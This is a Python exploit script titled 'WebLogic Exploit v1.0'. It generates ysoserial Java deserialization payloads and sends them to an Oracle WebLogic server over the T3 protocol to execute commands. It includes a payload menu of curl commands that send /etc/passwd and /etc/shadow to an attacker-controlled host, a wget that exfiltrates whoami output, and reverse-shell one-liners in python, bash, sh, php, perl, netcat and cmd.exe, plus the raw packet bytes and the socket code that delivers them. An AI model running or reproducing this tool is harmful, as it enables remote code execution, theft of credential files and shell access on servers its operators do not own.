#!/usr/bin/python
# WebLogic Exploit v1.0
# Coded By Joel Noguera - @niemand_sec
# Based on https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/weblogic.py
# Payload are being generated using https://github.com/frohoff/ysoserial

import socket
import sys
import struct
import subprocess
import argparse
import re

# Check if we are running this on windows platform
is_windows = sys.platform.startswith('win')


# Console Colors
if is_windows:
    G = '\033[92m'  # green
    Y = '\033[93m'  # yellow
    B = '\033[94m'  # blue
    R = '\033[91m'  # red
    W = '\033[0m'   # white
    try:
        import win_unicode_console , colorama
        win_unicode_console.enable()
        colorama.init()
    except:
        print("[!] Error: Coloring libraries not installed ,no coloring will be used")
        G = Y = B = R = W = G = Y = B = R = W = ''
else:
    G = '\033[92m'  # green
    Y = '\033[93m'  # yellow
    B = '\033[94m'  # blue
    R = '\033[91m'  # red
    W = '\033[0m'   # white


def banner():
    print("""%s
                ###################
                 __      __      ___.   .____                 .__
                /  \    /  \ ____\_ |__ |    |    ____   ____ |__| ____
                \   \/\/   // __ \| __ \|    |   /  _ \ / ___\|  |/ ___\.
                 \        /\  ___/| \_\ \    |__(  <_> ) /_/  >  \  \___
                  \__/\  /  \___  >___  /_______ \____/\___  /|__|\___  >
                       \/       \/    \/        \/    /_____/         \/
                ###################%s%s
                # Coded By Joel Noguera - @niemand_sec
    """ % (R, W, Y))


def ysoserial_info():
    print("""
    Available ysoserial payload types:
                BeanShell1 [org.beanshell:bsh:2.0b5]
                CommonsBeanutilsCollectionsLogging1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
                CommonsCollections1 [DEFAULT][commons-collections:commons-collections:3.1]
                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections3 [commons-collections:commons-collections:3.1]
                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
                Groovy1 [org.codehaus.groovy:groovy:2.3.9]
                Jdk7u21 []
                Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
    """)
    exit()


def existing_payloads():
    print("""
    Available exploit payloads:
                0-  Exit
                1-  Attempt to retrieve /etc/passwd file
                2-  Attempt to retrieve /etc/shadow file
                3-  whoami
                4-  Attempt to get reverse shell (python) - Linux
                5-  Attempt to get reverse shell (/bin/bash) - Linux
                6-  Attempt to get reverse shell (/bin/sh) - Linux
                7-  Attempt to get reverse shell (cmd.exe) - Windows
                8-  Attempt to get reverse shell (php) - Linux
                9-  Attempt to get reverse shell (netcat) - Linux
                10- Attempt to get reverse shell (perl) - Linux
    """)

def use_existing_payloads(option, lhost=None, lport=None):
    switcher = {
        1: "curl -i -X POST -F data=@/etc/passwd http://{0}:{1}".format(lhost,lport),
        2: "curl -i -X POST -F data=@/etc/shadow http://{0}:{1}".format(lhost,lport),
        3: "wget 'http://{0}:{1}/?$(whoami)'".format(lhost,lport),
        4: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}","{1}"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"'.format(lhost,lport),
        5: "/bin/bash -i > /dev/tcp/{0}/{1} 0>&1 2>&1".format(lhost,lport),
        6: "/bin/sh -i > /dev/tcp/{0}/{1} 0>&1 2>&1".format(lhost,lport),
        7: "nc -nv {0} {1} -e cmd.exe".format(lhost,lport),
        8: 'php -r "$sock=fsockopen(\'{0}\',{1});exec(\'/bin/sh -i <&3 >&3 2>&3\');"'.format(lhost,lport),
        9: "nc -e /bin/sh {0} {1}".format(lhost,lport),
        10: 'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''.format(lhost,lport)
    }
    return switcher.get(option, "99")

def parser_onerror(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    print(R + "[!]Error: " + errmsg + W)
    sys.exit()

def menu():
    command = " "
    while (command != "exit"):
        option = raw_input("Choose one option: ")
        if option == "0":
            exit()
        if option == "99":
            print "Invalid option"
            exit()
        return int(option)

def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -H 127.0.0.1 -P 7001 -p 'uname -a' -pt CommonsCollections1"
                                                                                     '\r\n\tpython ' + sys.argv[0] + " -H 127.0.0.1 -P 7001 -p 4\r\n")
    parser.error = parser_onerror
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-ly', '--list_ysoserial', help="List available ysoserial payload types", action="store_true")
    parser.add_argument('-lp', '--list_payloads', help='List available exploit payloads', action="store_true")
    parser.add_argument('-p', '--payload', help='Set custom payload to execute on server')
    parser.add_argument('-pt', '--payload_type', help='Set ysoserial payload type', default="CommonsCollections1")
    parser.add_argument('-H', '--host', help='IP from the HOST', default=None)
    parser.add_argument('-P', '--port', help='Port where WebLogic is listening', default=7001)
    parser.add_argument('-LH', '--local_host', help='IP from the HOST', default=None)
    parser.add_argument('-LP', '--local_port', help='Port where WebLogic is listening', default=4444)
    parser.add_argument('-ssl', '--ssl', help='Attempt to use SLL', action="store_true")
    return parser.parse_args()



if __name__ == "__main__":
    args = parse_args()
    payload = args.payload
    payload_type = args.payload_type
    host = args.host
    port = args.port
    ysoserial_list = args.list_ysoserial
    payload_list = args.list_payloads
    lhost = args.local_host
    lport = args.local_port
    ssl = args.ssl

    # Printing Banner
    banner()

    if ysoserial_list:
        ysoserial_info()

    if payload_list:
        existing_payloads()
        payload = use_existing_payloads(menu(), lhost, lport)

    pattern = re.compile("^[0-9]+")
    if pattern.match(payload):
        payload = use_existing_payloads(int(payload), lhost, lport)
    print "payload2", payload

    if payload is not None:
        subprocess.call(['java', '-jar', 'ysoserial-master-v0.0.4-gad26e2b-61.jar', payload_type, payload], stdout=open('payload_file', 'wb'))
    else:
        print "\r\n[!]Invalid Payload or Payload Type"
        exit()

    #print "[#]Payload chosen >> \r\n" + payload

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if host is not None and port is not None:
        server_address = (host, port)
        print 'connecting to %s port %s' % server_address
        try:
            sock.connect(server_address)
        except:
            print "\r\n[!]Couldn't connect to %s port %s" % server_address
            exit()
    else:
        print '\r\n[!]Invalid host or port'
        exit()

    # Send headers
    if ssl:
        #Not checked yet
        headers='t3s 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
    else:
        headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
    print 'sending "%s"' % headers
    sock.sendall(headers)

    data = sock.recv(1024)
    print >>sys.stderr, 'received "%s"' % data

    payloadObj = open('payload_file','rb').read()

    payload='\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
    payload=payload+payloadObj
    payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'

    # adjust header for appropriate message length
    payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])

    print 'sending payload...'
    sock.send(payload)
